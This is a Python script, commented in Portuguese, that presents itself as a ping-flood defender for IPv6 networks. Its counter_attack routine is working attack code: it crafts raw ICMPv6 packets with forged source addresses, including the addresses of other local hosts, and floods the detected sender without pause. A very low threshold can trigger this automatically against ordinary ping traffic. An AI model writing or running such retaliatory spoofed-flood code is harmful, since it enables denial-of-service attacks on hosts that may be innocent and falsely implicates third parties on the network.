#!/usr/bin/env python3
import socket
import struct
import time
import threading
import sys
import fcntl
import array

# --- Configurações ---
# Coloque aqui o nome da sua interface de rede (ex: 'eth0', 'enp0s3')
NETWORK_INTERFACE = "wlan0" 
# Limite para detecção de flood (pacotes por segundo)
FLOOD_THRESHOLD = 5
# Duração da janela de tempo para detectar o flood (em segundos)
TIME_WINDOW = 25
# IPs de outros hosts na sua sub-rede para simular o DDoS
# Adicione os IPs IPv6 dos seus outros hosts da rede local aqui
SIMULATED_DDoS_HOSTS = [
    "fe80::a00:27ff:fe12:3457", 
    "fe80::a00:27ff:feab:cdef"
]

class PingFloodDefender:
    def __init__(self, interface):
        self.interface = interface
        self.packet_counts = {}
        self.attackers = {}
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.local_mac = self.get_mac_address(interface)
        self.local_ipv6 = self.get_ipv6_address(interface)

        if not self.local_mac or not self.local_ipv6:
            print(f"[-] Não foi possível obter o endereço MAC/IPv6 para a interface {interface}. Saindo.")
            sys.exit(1)
            
        print(f"[+] Monitorando na interface: {self.interface}")
        print(f"[+] Endereço MAC Local: {self.local_mac}")
        print(f"[+] Endereço IPv6 Local: {self.local_ipv6}")

    def get_mac_address(self, ifname):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', bytes(ifname[:15], 'utf-8')))
            return ':'.join('%02x' % b for b in info[18:24])
        except IOError:
            return None

    def get_ipv6_address(self, ifname):
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            # Tenta obter o endereço global, se não, o link-local
            # A chamada ioctl para IPv6 é mais complexa e varia.
            # Uma forma mais portável é parsear a saída de `ip addr`.
            # Para simplificar, vamos usar uma abordagem de socket.
            # Isto pode pegar o link-local, que é suficiente para a sub-rede.
            s.connect(("google.com", 80)) # Apenas para obter o IP de saída
            ip = s.getsockname()[0]
            if ip.startswith("::ffff:"): # Endereço mapeado para IPv4
                # Método alternativo para ambientes sem rota IPv6 externa
                with open('/proc/net/if_inet6') as f:
                    for line in f:
                        parts = line.strip().split()
                        # Formato: addr, netmask_len, scope, flags, dev_name
                        if parts[5] == ifname and parts[3] == '00': # Scope 00 == Global
                            addr_hex = parts[0]
                            # Formatar para o formato IPv6 padrão
                            return ':'.join(addr_hex[i:i+4] for i in range(0, 32, 4))
                # Fallback para link-local se não houver global
                with open('/proc/net/if_inet6') as f:
                    for line in f:
                        parts = line.strip().split()
                        if parts[5] == ifname and parts[2] == '20': # Scope 20 == Link
                             addr_hex = parts[0]
                             return ':'.join(addr_hex[i:i+4] for i in range(0, 32, 4)) + f"%{ifname}"

            return ip
        except Exception:
            # Fallback robusto se a conexão falhar
            try:
                with open('/proc/net/if_inet6') as f:
                    for line in f:
                        parts = line.strip().split()
                        if parts[5] == ifname and parts[3] == '20': # Scope link-local
                            addr_hex = parts[0]
                            # Formatar como a:b:c:d...
                            addr_parts = [addr_hex[i:i+4] for i in range(0, 32, 4)]
                            return ':'.join(addr_parts) + f"%{ifname}"
            except IOError:
                return None
        return None


    def calculate_checksum(self, msg):
        """Calcula o checksum para pacotes ICMPv6."""
        s = 0
        # Itera sobre o pacote em pedaços de 16-bit
        for i in range(0, len(msg), 2):
            w = msg[i] + (msg[i+1] << 8)
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        # Complemento de um
        s = ~s & 0xffff
        return s

    def craft_counter_packet(self, dest_mac_str, attacker_ipv6_str, spoofed_src_ipv6_str):
        """Cria um pacote ICMPv6 Echo Request com IP de origem forjado."""
        # --- L2 - Cabeçalho Ethernet ---
        dest_mac = bytes.fromhex(dest_mac_str.replace(':', ''))
        src_mac = bytes.fromhex(self.local_mac.replace(':', ''))
        eth_protocol = 0x86DD  # IPv6
        eth_header = struct.pack("!6s6sH", dest_mac, src_mac, eth_protocol)
        
        # --- L3 - Cabeçalho IPv6 ---
        # Version (4 bits), Traffic Class (8 bits), Flow Label (20 bits)
        version_tc_flow = (6 << 28)
        payload_length = 8  # ICMPv6 Echo Request tem 8 bytes
        next_header = 58    # ICMPv6
        hop_limit = 64
        
        # Converte IPs para formato binário
        src_ip = socket.inet_pton(socket.AF_INET6, spoofed_src_ipv6_str.split('%')[0])
        dest_ip = socket.inet_pton(socket.AF_INET6, attacker_ipv6_str.split('%')[0])

        ipv6_header = struct.pack("!IHBB16s16s",
                                 version_tc_flow,
                                 payload_length,
                                 next_header,
                                 hop_limit,
                                 src_ip,
                                 dest_ip)

        # --- L4 - Cabeçalho ICMPv6 ---
        icmp_type = 128  # Echo Request
        icmp_code = 0
        icmp_checksum = 0 # Checsum é calculado depois
        icmp_id = 1337   # Identificador
        icmp_seq = 1     # Sequência
        
        icmp_header_no_checksum = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        # --- Cálculo do Checksum ICMPv6 ---
        # O checksum requer um pseudo-cabeçalho
        pseudo_header = src_ip + dest_ip + struct.pack('!I', payload_length) + b'\x00\x00\x00' + struct.pack('!B', next_header)
        checksum_payload = pseudo_header + icmp_header_no_checksum
        icmp_checksum = self.calculate_checksum(checksum_payload)
        
        # Monta o cabeçalho ICMPv6 final com o checksum correto
        icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(icmp_checksum), icmp_id, icmp_seq)
        
        # --- Pacote Completo ---
        packet = eth_header + ipv6_header + icmp_header
        return packet

    def counter_attack(self, attacker_mac, attacker_ipv6):
        """Thread que executa o contra-ataque em flooding."""
        print(f"\n[!!!] ATAQUE DETECTADO de {attacker_ipv6} ({attacker_mac})")
        print(f"[>>>] INICIANDO CONTRA-ATAQUE...")

        try:
            # Socket para envio do contra-ataque
            send_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            send_socket.bind((self.interface, 0))
            
            # 1. Ataque de Reflexão (IP Spoofing)
            print(f"[>>>] Fase 1: Ataque de reflexão. Forjando IP de origem para {attacker_ipv6}")
            spoofed_packet = self.craft_counter_packet(attacker_mac, attacker_ipv6, attacker_ipv6)
            
            # 2. Ataque DDoS Simulado
            # Criamos pacotes que parecem vir de outros hosts na rede
            ddos_packets = []
            if SIMULATED_DDoS_HOSTS:
                print(f"[>>>] Fase 2: Ataque DDoS simulado. Usando IPs: {SIMULATED_DDoS_HOSTS}")
                for host_ip in SIMULATED_DDoS_HOSTS:
                    try:
                        packet = self.craft_counter_packet(attacker_mac, attacker_ipv6, host_ip)
                        ddos_packets.append(packet)
                    except socket.error as e:
                        print(f"[!] Aviso: Não foi possível converter o IP {host_ip}. Ignorando. Erro: {e}")
            
            all_packets = [spoofed_packet] + ddos_packets
            packet_idx = 0
            
            while not self.stop_event.is_set() and attacker_ipv6 in self.attackers:
                packet_to_send = all_packets[packet_idx]
                send_socket.send(packet_to_send)
                packet_idx = (packet_idx + 1) % len(all_packets)
                # Não colocar sleep para gerar um flood real

        except Exception as e:
            print(f"\n[-] Erro na thread de contra-ataque: {e}")
        finally:
            print(f"[<<<] Contra-ataque para {attacker_ipv6} parado.")
            send_socket.close()

    def monitor_and_detect(self):
        """Thread principal que monitora o tráfego e detecta floods."""
        # Socket raw para receber todos os pacotes da camada 2
        try:
            recv_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x86DD)) # 0x86DD é EtherType para IPv6
        except PermissionError:
            print("[-] Erro: Este script precisa ser executado com privilégios de root (sudo).")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Erro ao criar o socket de escuta: {e}")
            sys.exit(1)

        print("[+] Escutando por pacotes ICMPv6...")
        
        while not self.stop_event.is_set():
            try:
                # Recebe o frame Ethernet completo
                raw_packet, addr = recv_socket.recvfrom(65535)
                
                # --- Desempacota o cabeçalho Ethernet (L2) ---
                # 6s (MAC Dest), 6s (MAC Src), H (EtherType)
                eth_header = raw_packet[:14]
                eth_fields = struct.unpack("!6s6sH", eth_header)
                dest_mac_bytes, src_mac_bytes, eth_type = eth_fields
                
                # Ignora pacotes que não são IPv6 (embora o socket já filtre)
                if eth_type != 0x86DD:
                    continue

                # --- Desempacota o cabeçalho IPv6 (L3) ---
                ipv6_header = raw_packet[14:54]
                # Apenas precisamos do IP de origem, destino e Next Header
                # Ignoramos os primeiros 8 bytes (version, tc, flow, payload_len)
                next_header, hop_limit, src_ip_bytes, dest_ip_bytes = struct.unpack("!BB16s16s", ipv6_header[6:])
                
                # Converte IPs de bytes para string
                src_ipv6 = socket.inet_ntop(socket.AF_INET6, src_ip_bytes)
                dest_ipv6 = socket.inet_ntop(socket.AF_INET6, dest_ip_bytes)
                
                # Ignora pacotes que não são para nós ou são de nós mesmos
                # (o .split('%') remove o ID da zona como %eth0)
                if dest_ipv6.split('%')[0] != self.local_ipv6.split('%')[0] or src_ipv6.split('%')[0] == self.local_ipv6.split('%')[0]:
                    continue

                # --- Verifica se é um pacote ICMPv6 (Next Header = 58) ---
                if next_header == 58:
                    icmpv6_header = raw_packet[54:62] # ICMPv6 header tem 8 bytes
                    icmp_type, _, _, _, _ = struct.unpack("!BBHHH", icmpv6_header)
                    
                    # Verifica se é um Echo Request (Type = 128)
                    if icmp_type == 128:
                        current_time = time.time()
                        src_mac_str = ':'.join('%02x' % b for b in src_mac_bytes)
                        #print(f"[*] ICMPv6 Echo Request recebido de: {src_ipv6} ({src_mac_str})")
                        
                        # --- Lógica de Detecção de Flood ---
                        with self.lock:
                            # Limpa registros antigos
                            self.packet_counts = {
                                ip: [(ts, mac) for ts, mac in times if current_time - ts < TIME_WINDOW]
                                for ip, times in self.packet_counts.items()
                            }
                            
                            # Adiciona o pacote atual
                            if src_ipv6 not in self.packet_counts:
                                self.packet_counts[src_ipv6] = []
                            self.packet_counts[src_ipv6].append((current_time, src_mac_str))
                            
                            # Verifica se é um flood
                            count = len(self.packet_counts[src_ipv6])
                            if count > FLOOD_THRESHOLD and src_ipv6 not in self.attackers:
                                self.attackers[src_ipv6] = src_mac_str
                                # Inicia a thread de contra-ataque
                                attack_thread = threading.Thread(target=self.counter_attack, args=(src_mac_str, src_ipv6))
                                attack_thread.daemon = True
                                attack_thread.start()

            except KeyboardInterrupt:
                print("\n[!] Interrupção de teclado recebida. Parando...")
                self.stop_event.set()
                break
            except Exception as e:
                # Ignora erros comuns de desempacotamento de pacotes malformados
                # print(f"[-] Erro no loop de monitoramento: {e}")
                pass
        
        recv_socket.close()
        print("[+] Socket de escuta fechado. Programa encerrado.")

    def run(self):
        monitor_thread = threading.Thread(target=self.monitor_and_detect)
        monitor_thread.start()
        monitor_thread.join()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        NETWORK_INTERFACE = sys.argv[1]
    
    defender = PingFloodDefender(interface=NETWORK_INTERFACE)
    defender.run()
